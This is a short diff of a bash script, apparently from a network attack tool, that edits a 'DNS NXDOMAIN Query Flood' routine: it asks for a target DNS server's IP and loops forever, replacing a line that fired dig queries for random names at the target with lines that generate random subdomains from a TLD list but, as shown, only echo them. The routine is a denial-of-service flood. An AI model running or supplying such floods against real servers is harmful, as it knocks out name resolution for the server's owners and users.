@@ -1043,7 +1043,13 @@ echo "Enter the IP address of the target DNS server:"
 read -i $DNSTARGET -e DNSTARGET
 echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
 while :
-do dig $RANDOM.$RANDOM$RANDOM @$DNSTARGET
+do
+TLD=(${TLDLIST[RANDOM%21]})
+RANDLONG=$((RANDOM % 20 +1))
+STRING=$(< /dev/urandom tr -dc a-z-0-9 | head -c$RANDLONG)
+echo $RANDOM.$STRING.$TLD
+echo $RANDOM.$TLD
+echo $STRING.$TLD
 done
 exit 0
 }
